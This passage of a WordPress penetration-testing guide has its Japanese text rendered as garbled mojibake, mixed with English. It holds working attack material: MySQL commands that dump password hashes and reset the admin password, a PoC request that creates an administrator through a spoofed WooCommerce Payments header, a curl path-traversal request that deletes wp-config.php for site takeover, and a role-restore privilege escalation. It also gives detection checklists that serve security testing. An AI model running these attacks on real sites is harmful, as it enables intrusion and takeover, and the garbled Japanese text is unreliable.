- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã€Œreflex-galleryã€ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦æœ‰åŠ¹åŒ–ã™ã‚‹ã¨ã€è„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ãŸã‚æ‚ªç”¨ã§ãã¾ã™ã€‚
- Metasploit framework ã¯ã“ã®è„†å¼±æ€§ã«å¯¾ã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æä¾›ã—ã¾ã™ã€‚é©åˆ‡ãªãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’èª­ã¿è¾¼ã¿ã€ç‰¹å®šã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€meterpreter ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç¢ºç«‹ã—ã€ã‚µã‚¤ãƒˆã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
- ã“ã‚Œã¯ WordPress ã‚µã‚¤ãƒˆã‚’æ‚ªç”¨ã™ã‚‹å¤šãã®æ–¹æ³•ã®ä¸€ã¤ã«éããªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

ã“ã®å†…å®¹ã«ã¯ã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã¨æœ‰åŠ¹åŒ–ã®æ‰‹é †ã‚’ç¤ºã™ WordPress ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã®è¦–è¦šçš„è£œåŠ©ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ãŸã ã—ã€æ­£å½“ãªè¨±å¯ãªã—ã«ã“ã®ã‚ˆã†ãªæ–¹æ³•ã§è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯é•æ³•ã‹ã¤éå€«ç†çš„ã§ã‚ã‚‹ç‚¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚æœ¬æƒ…å ±ã¯è²¬ä»»ã‚’æŒã£ã¦ã€æ˜ç¤ºçš„ãªè¨±å¯ã®ã‚ã‚‹ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆãªã©æ³•çš„ãªæ–‡è„ˆã§ã®ã¿ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS ã‹ã‚‰ RCE ã¸

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ã¯ã€WordPress ã® **Cross-Site Scripting (XSS)** è„†å¼±æ€§ã‚’ **Remote Code Execution (RCE)** ã‚„ãã®ä»–ã®é‡å¤§ãªè„†å¼±æ€§ã«ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã•ã›ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚è©³ç´°ã¯ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚**Wordpress Versions 6.X.X, 5.X.X and 4.X.X.** ã‚’ã‚µãƒãƒ¼ãƒˆã—ã€ä»¥ä¸‹ã‚’å¯èƒ½ã«ã—ã¾ã™:
- _**Privilege Escalation:**_ WordPress ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã¾ã™ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ï¼ˆãƒãƒƒã‚¯ãƒ‰ã‚¢ï¼‰ã‚’ WordPress ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
- _**(RCE) Built-In Plugin Edit:**_ WordPress ã®çµ„ã¿è¾¼ã¿ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(RCE) Built-In Theme Edit:**_ WordPress ã®çµ„ã¿è¾¼ã¿ãƒ†ãƒ¼ãƒã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(Custom) Custom Exploits:**_ ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã® WordPress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³/ãƒ†ãƒ¼ãƒå‘ã‘ã®ã‚«ã‚¹ã‚¿ãƒ ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã€‚

## ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
adminã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ Pentest

### æ”»æ’ƒå¯¾è±¡

Wordpress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹ã‹ã‚’çŸ¥ã‚‹ã“ã¨ã¯ã€ãã®æ©Ÿèƒ½ã®è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚ä»¥ä¸‹ã®ç®‡æ¡æ›¸ãã§ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹æ–¹æ³•ã¨ã€è„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ä¾‹ã‚’ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) ã§ç¢ºèªã§ãã¾ã™ã€‚

- **`wp_ajax`**

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹æ–¹æ³•ã®ä¸€ã¤ã«ã€AJAXãƒãƒ³ãƒ‰ãƒ©çµŒç”±ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ãƒ­ã‚¸ãƒƒã‚¯ã€authorizationã€ã¾ãŸã¯ authentication ã®ãƒã‚°ã‚’å«ã‚“ã§ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€ã“ã‚Œã‚‰ã®é–¢æ•°ã¯èªè¨¼ã¨èªå¯ã®ä¸¡æ–¹ã‚’ Wordpress nonce ã®å­˜åœ¨ã«åŸºã¥ã„ã¦ã„ã‚‹ã“ã¨ãŒå¤šãã€**Wordpress ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§èªè¨¼ã•ã‚ŒãŸä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæŒã£ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ï¼ˆå½¹å‰²ã«é–¢ä¿‚ãªãï¼‰ã€‚

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã®é–¢æ•°ã‚’å…¬é–‹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹é–¢æ•°ã¯ä»¥ä¸‹ã®ã¨ãŠã‚Šã§ã™:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` ã®ä½¿ç”¨ã«ã‚ˆã‚Šã€ãã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆæœªèªè¨¼ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚‚å«ã‚€ï¼‰ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚**

> [!CAUTION]
> ã•ã‚‰ã«ã€é–¢æ•°ãŒ `wp_verify_nonce` ã‚’ä½¿ã£ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªå¯ã®ã¿ã‚’ç¢ºèªã—ã¦ã„ã‚‹ã ã‘ã®å ´åˆã€ã“ã®é–¢æ•°ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã ã‘ã§ã€é€šå¸¸ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ãƒ¼ãƒ«ï¼ˆæ¨©é™ï¼‰ã‚’ç¢ºèªã—ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æ¨©é™ã®ä½ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒé«˜æ¨©é™ã®æ“ä½œã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

- **REST API**

wordpress ã‹ã‚‰é–¢æ•°ã‚’ `register_rest_route` é–¢æ•°ã‚’ä½¿ã£ã¦ rest AP ã‚’ç™»éŒ²ã—ã¦å…¬é–‹ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` is a callback to function that checks if a given user is authorized to call the API method.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **Direct access to the php file**

ã‚‚ã¡ã‚ã‚“ã€Wordpress ã¯ PHP ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã‚¦ã‚§ãƒ–ã‹ã‚‰ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹è„†å¼±ãªæ©Ÿèƒ½ã‚’ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒå…¬é–‹ã—ã¦ã„ã‚‹å ´åˆã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œå¾—ã¾ã™ã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯å†…éƒ¨é€£æºã‚„ reverse proxies å‘ã‘ã« â€œtrusted headerâ€ ã®ã‚·ãƒ§ãƒ¼ãƒˆã‚«ãƒƒãƒˆã‚’å®Ÿè£…ã—ã€ãã®ãƒ˜ãƒƒãƒ€ã‚’ REST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã—ã¾ã™ã€‚ä¸Šæµã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã‚ˆã£ã¦ãƒ˜ãƒƒãƒ€ãŒæš—å·å­¦çš„ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ç´ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯ãã‚Œã‚’å½è£…ã—ã¦ administrator ã¨ã—ã¦ç‰¹æ¨©ã®ã‚ã‚‹ REST ãƒ«ãƒ¼ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

- Impact: æœªèªè¨¼ã® privilege escalation ã«ã‚ˆã‚Šã€core users REST route ã‚’é€šã—ã¦æ–°ã—ã„ administrator ã‚’ä½œæˆã— admin æ¨©é™ã‚’å–å¾—ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, typically the first administrator account).
- Exploited route: `POST /wp-json/wp/v2/users` ã«å¯¾ã—ã€æ˜‡æ ¼ã—ãŸ role é…åˆ—ã‚’å«ã‚€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã€‚

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ãªãœå‹•ä½œã™ã‚‹ã‹

- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒåˆ¶å¾¡ã™ã‚‹ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’èªè¨¼çŠ¶æ…‹ã«ãƒãƒƒãƒ”ãƒ³ã‚°ã—ã€capability ãƒã‚§ãƒƒã‚¯ã‚’ã‚¹ã‚­ãƒƒãƒ—ã™ã‚‹ã€‚
- WordPress core ã¯ã“ã®ãƒ«ãƒ¼ãƒˆã«å¯¾ã—ã¦ `create_users` capability ã‚’æœŸå¾…ã—ã¦ã„ã‚‹ï¼›ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ãƒãƒƒã‚¯ã¯ãƒ˜ãƒƒãƒ€ãƒ¼ã‹ã‚‰ç›´æ¥ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã€‚

æœŸå¾…ã•ã‚Œã‚‹æˆåŠŸæŒ‡æ¨™

- ä½œæˆã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¨˜è¿°ã™ã‚‹ JSON ãƒœãƒ‡ã‚£ã‚’ä¼´ã† HTTP 201ã€‚
- `wp-admin/users.php` ã«è¡¨ç¤ºã•ã‚Œã‚‹æ–°ã—ã„ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€‚

æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

- grep ã§ `getallheaders()`, `$_SERVER['HTTP_...']`ã€ã¾ãŸã¯ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’èª­ã¿å–ã£ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãƒ™ãƒ³ãƒ€ãƒ¼ SDKï¼ˆä¾‹: `wp_set_current_user()`, `wp_set_auth_cookie()`ï¼‰ã‚’æ¢ã™ã€‚
- å¼·å›ºãª `permission_callback` ãƒã‚§ãƒƒã‚¯ã‚’æ¬ ãã€ä»£ã‚ã‚Šã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼ã«ä¾å­˜ã™ã‚‹ç‰¹æ¨©ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã«ã¤ã„ã¦ REST ç™»éŒ²ã‚’ç¢ºèªã™ã‚‹ã€‚
- REST ãƒãƒ³ãƒ‰ãƒ©å†…ã§ãƒ˜ãƒƒãƒ€ãƒ¼å€¤ã®ã¿ã§ã‚²ãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ã‚³ã‚¢ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ç®¡ç†é–¢æ•°ï¼ˆ`wp_insert_user`, `wp_create_user`ï¼‰ã®ä½¿ç”¨ã‚’æ¢ã™ã€‚

### wp_ajax_nopriv ã«ã‚ˆã‚‹æœªèªè¨¼ã®ä»»æ„ãƒ•ã‚¡ã‚¤ãƒ«å‰Šé™¤ (Litho Theme <= 3.0)

WordPress ã®ãƒ†ãƒ¼ãƒã‚„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã—ã°ã—ã° `wp_ajax_` ãŠã‚ˆã³ `wp_ajax_nopriv_` ãƒ•ãƒƒã‚¯ã‚’é€šã˜ã¦ AJAX ãƒãƒ³ãƒ‰ãƒ©ã‚’å…¬é–‹ã™ã‚‹ã€‚**_nopriv_** ãƒãƒªã‚¢ãƒ³ãƒˆãŒä½¿ã‚ã‚Œã‚‹ã¨ **ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã¯æœªèªè¨¼ã®è¨ªå•è€…ã‹ã‚‰åˆ°é”å¯èƒ½ã«ãªã‚‹**ãŸã‚ã€æ©Ÿå¯†æ€§ã®é«˜ã„å‡¦ç†ã¯æ¬¡ã‚’è¿½åŠ ã§å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚‹:

1. **capability check**ï¼ˆä¾‹: `current_user_can()` ã¾ãŸã¯å°‘ãªãã¨ã‚‚ `is_user_logged_in()`ï¼‰ã€ãŠã‚ˆã³
2. `check_ajax_referer()` / `wp_verify_nonce()` ã§æ¤œè¨¼ã•ã‚ŒãŸ **CSRF nonce**ã€ãŠã‚ˆã³
3. **å³æ ¼ãªå…¥åŠ›ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚ºï¼æ¤œè¨¼**ã€‚

Litho multipurpose theme (< 3.1) ã¯ *Remove Font Family* æ©Ÿèƒ½ã§ã“ã‚Œã‚‰3ã¤ã®ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã‚’å¿˜ã‚Œã¦ã—ã¾ã„ã€çµæœã¨ã—ã¦æ¬¡ã®ã‚³ãƒ¼ãƒ‰ï¼ˆç°¡ç•¥åŒ–ï¼‰ã‚’å‡ºè·ã—ãŸï¼š
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **èªè¨¼ãªã—ã§ã®ã‚¢ã‚¯ã‚»ã‚¹** â€“ the `wp_ajax_nopriv_` hook is registered.
* **nonce / capability ãƒã‚§ãƒƒã‚¯ãªã—** â€“ ä»»æ„ã®è¨ªå•è€…ãŒã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã€‚
* **ãƒ‘ã‚¹ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚ºãªã—** â€“ ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¶å¾¡ã® `fontfamily` æ–‡å­—åˆ—ãŒãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ãªã—ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‘ã‚¹ã«é€£çµã•ã‚Œã€å¤å…¸çš„ãª `../../` ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’è¨±å¯ã—ã¦ã„ã‚‹ã€‚

#### æ‚ªç”¨

æ”»æ’ƒè€…ã¯å˜ä¸€ã® HTTP POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã“ã¨ã§ã€é€šå¸¸ `<wp-root>/wp-content/uploads/` ã®**uploads base directory ä»¥ä¸‹**ã«ã‚ã‚‹ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å‰Šé™¤ã§ãã‚‹:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

* ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ˜ãƒ«ãƒ‘ãƒ¼ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()` ãªã©ï¼‰ã‚’å‘¼ã³å‡ºã™ `add_action( 'wp_ajax_nopriv_...')` ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã€‚
* æœªã‚µãƒ‹ã‚¿ã‚¤ã‚ºã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’ãƒ‘ã‚¹ã«é€£çµã—ã¦ã„ã‚‹ç®‡æ‰€ï¼ˆ`$_POST`, `$_GET`, `$_REQUEST` ã‚’æ¢ã™ï¼‰ã€‚
* `check_ajax_referer()` ã‚„ `current_user_can()`/`is_user_logged_in()` ãŒæ¬ å¦‚ã—ã¦ã„ã‚‹ã“ã¨ã€‚

---

### å¤ã„ãƒ­ãƒ¼ãƒ«ã®å¾©å…ƒã¨èªå¯ä¸è¶³ã«ã‚ˆã‚‹æ¨©é™æ˜‡æ ¼ (ASE "View Admin as Role")

å¤šãã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€å…ƒã®ãƒ­ãƒ¼ãƒ«ã‚’ user meta ã«ä¿å­˜ã—ã¦å¾Œã§å¾©å…ƒã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã€ã€Œview as roleã€ã‚„ä¸€æ™‚çš„ãªãƒ­ãƒ¼ãƒ«åˆ‡æ›¿æ©Ÿèƒ½ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚å¾©å…ƒå‡¦ç†ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆä¾‹: `$_REQUEST['reset-for']`ï¼‰ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒç®¡ç†ã™ã‚‹ãƒªã‚¹ãƒˆã ã‘ã«ä¾å­˜ã—ã€æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚„æœ‰åŠ¹ãª nonce ã®æ¤œè¨¼ã‚’è¡Œã‚ãªã„å ´åˆã€ã“ã‚Œã¯å‚ç›´çš„ãªæ¨©é™æ˜‡æ ¼ã«ãªã‚Šã¾ã™ã€‚

å®Ÿéš›ã®ä¾‹ã¨ã—ã¦ Admin and Site Enhancements (ASE) ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ (â‰¤ 7.6.2.1) ã«ã¦ç™ºè¦‹ã•ã‚Œã¾ã—ãŸã€‚ãƒªã‚»ãƒƒãƒˆã®å‡¦ç†ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒå†…éƒ¨é…åˆ— `$options['viewing_admin_as_role_are']` ã«å­˜åœ¨ã™ã‚‹å ´åˆã« `reset-for=<username>` ã«åŸºã¥ã„ã¦ãƒ­ãƒ¼ãƒ«ã‚’å¾©å…ƒã—ã¦ã„ã¾ã—ãŸãŒã€ç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã¦ user meta `_asenha_view_admin_as_original_roles` ã‹ã‚‰ä¿å­˜ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã‚’å†è¿½åŠ ã™ã‚‹å‰ã« `current_user_can()` ãƒã‚§ãƒƒã‚¯ã‚‚ nonce ã®æ¤œè¨¼ã‚‚è¡Œã£ã¦ã„ã¾ã›ã‚“ã§ã—ãŸï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- ã‚µãƒ¼ãƒãƒ¼å´ã®èªå¯ãªã—ã« `$_REQUEST['reset-for']` ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä¿¡é ¼ã—ã¦ã„ã‚‹ã€‚
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä»¥å‰ã«ã‚ˆã‚Šé«˜ã„æ¨©é™ã‚’ `_asenha_view_admin_as_original_roles` ã«ä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€å¾Œã§é™æ ¼ã•ã‚ŒãŸå ´åˆã€ãƒªã‚»ãƒƒãƒˆç”¨ã®ãƒ‘ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ãã‚Œã‚’å¾©å…ƒã§ãã‚‹ã€‚
- ä¸€éƒ¨ã®å°å…¥ç’°å¢ƒã§ã¯ã€èªè¨¼æ¸ˆã¿ã®ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ `viewing_admin_as_role_are` ã«ã¾ã å­˜åœ¨ã™ã‚‹åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®ãƒªã‚»ãƒƒãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ãã‚‹ï¼ˆèªå¯ã®ä¸å‚™ï¼‰ã€‚

æ‚ªç”¨ï¼ˆä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
è„†å¼±ãªãƒ“ãƒ«ãƒ‰ã§ã¯ã€ç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã¦ä¿å­˜ã•ã‚ŒãŸå…ƒã®ãƒ­ãƒ¼ãƒ«ï¼ˆä¾‹: `administrator`ï¼‰ã‚’å†è¿½åŠ ã—ã€å®Ÿè³ªçš„ã«æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã¾ã™ã€‚

Detection checklist

- Look for role-switching features that persist â€œoriginal rolesâ€ in user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Identify reset/restore paths that:
- Read usernames from `$_REQUEST` / `$_GET` / `$_POST`.
- Modify roles via `add_role()` / `remove_role()` without `current_user_can()` and `wp_verify_nonce()` / `check_admin_referer()`.
- Authorize based on a plugin option array (e.g., `viewing_admin_as_role_are`) instead of the actorâ€™s capabilities.

---

### cookie ã‚’ä¿¡é ¼ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¹ã‚¤ãƒƒãƒã‚’ public `init` ã«æ¥ç¶šã—ãŸå ´åˆã®èªè¨¼ã•ã‚Œã¦ã„ãªã„æ¨©é™æ˜‡æ ¼ (Service Finder â€œsf-bookingâ€)

